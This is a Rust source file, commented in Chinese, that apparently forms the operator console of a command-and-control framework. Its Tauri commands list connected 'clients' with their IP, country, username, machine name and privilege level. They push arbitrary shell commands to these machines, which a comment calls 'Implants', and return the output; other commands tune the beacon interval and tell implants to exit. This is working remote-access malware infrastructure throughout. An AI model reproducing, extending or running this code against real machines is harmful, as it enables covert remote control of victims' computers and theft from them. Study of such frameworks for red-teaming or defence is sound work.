//! 客户端相关 Tauri 命令

use crate::state::SharedState;
use serde::Serialize;
use shared::messages::{Message, ShellExecute, SetBeaconInterval};
use tauri::State;

#[derive(Debug, Serialize)]
pub struct ClientInfo {
    pub id: String,
    pub ip_address: String,
    pub version: String,
    pub operating_system: String,
    pub account_type: String,
    pub country: String,
    pub username: String,
    pub pc_name: String,
    pub tag: String,
    pub connected_at: String,
    pub last_seen: String,
    pub beacon_interval: u64,
}

/// 获取所有连接的客户端（自动清理超时的客户端）
#[tauri::command]
pub fn get_clients(state: State<SharedState>) -> Vec<ClientInfo> {
    use chrono::Utc;
    
    let now = Utc::now();
    
    // 首先收集超时的客户端 ID
    let timeout_ids: Vec<String> = state.clients.read()
        .iter()
        .filter_map(|(id, c)| {
            // 超时阈值 = max(心跳间隔 * 3 + 30, 120) 秒
            // 确保最少 120 秒，防止修改间隔后误删
            let calculated = c.beacon_interval * 3 + 30;
            let timeout_seconds = std::cmp::max(calculated, 120) as i64;
            let elapsed = now.signed_duration_since(c.last_seen).num_seconds();
            if elapsed > timeout_seconds {
                Some(id.clone())
            } else {
                None
            }
        })
        .collect();
    
    // 清理超时的客户端
    if !timeout_ids.is_empty() {
        let mut clients = state.clients.write();
        for id in &timeout_ids {
            clients.remove(id);
            println!("[*] Client {} timed out and removed", id);
        }
    }
    
    // 返回剩余的活跃客户端
    state.get_clients()
        .into_iter()
        .map(|c| ClientInfo {
            id: c.id,
            ip_address: c.ip_address,
            version: c.version,
            operating_system: c.operating_system,
            account_type: c.account_type,
            country: c.country,
            username: c.username,
            pc_name: c.pc_name,
            tag: c.tag,
            connected_at: c.connected_at.to_rfc3339(),
            last_seen: c.last_seen.to_rfc3339(),
            beacon_interval: c.beacon_interval,
        })
        .collect()
}

/// 向客户端发送 Shell 命令
#[tauri::command]
pub async fn send_shell_command(
    state: State<'_, SharedState>,
    client_id: String,
    command: String,
) -> Result<(), String> {
    let msg = Message::ShellExecute(ShellExecute { command });
    let data = msg.serialize().map_err(|e| e.to_string())?;
    
    crate::listener::send_to_client(&state, &client_id, &data);
    
    Ok(())
}

/// 断开客户端连接 - 发送退出命令
#[tauri::command]
pub async fn disconnect_client(
    state: State<'_, SharedState>,
    client_id: String,
) -> Result<(), String> {
    // 发送 Exit 命令让客户端真正退出
    // 注意：不要立即调用 remove_client，否则会清除 pending_commands
    // Implant 下次轮询时会收到 Exit 命令并退出
    let msg = Message::Exit;
    if let Ok(data) = msg.serialize() {
        crate::listener::send_to_client(&state, &client_id, &data);
        println!("[*] Exit command sent to client: {}", client_id);
    }
    
    // 只从客户端列表移除，保留 pending_commands 让 Implant 能收到 Exit
    state.clients.write().remove(&client_id);
    
    Ok(())
}

/// Shell 响应信息
#[derive(Debug, Serialize)]
pub struct ShellResponseInfo {
    pub output: String,
    pub is_error: bool,
    pub timestamp: i64,
}

/// 获取指定客户端的 Shell 响应
#[tauri::command]
pub fn get_shell_responses(
    state: State<SharedState>,
    client_id: String,
) -> Vec<ShellResponseInfo> {
    state.take_shell_responses(&client_id)
        .into_iter()
        .map(|r| ShellResponseInfo {
            output: r.output,
            is_error: r.is_error,
            timestamp: r.timestamp,
        })
        .collect()
}

/// 设置客户端心跳间隔
#[tauri::command]
pub async fn set_beacon_interval(
    state: State<'_, SharedState>,
    client_id: String,
    interval_seconds: u64,
) -> Result<(), String> {
    let msg = Message::SetBeaconInterval(SetBeaconInterval { interval_seconds });
    if let Ok(data) = msg.serialize() {
        crate::listener::send_to_client(&state, &client_id, &data);
        
        // 更新服务端存储的心跳间隔
        if let Some(client) = state.clients.write().get_mut(&client_id) {
            client.beacon_interval = interval_seconds;
        }
        
        println!("[*] Set beacon interval to {} seconds for client: {}", interval_seconds, client_id);
        Ok(())
    } else {
        Err("Failed to serialize message".to_string())
    }
}

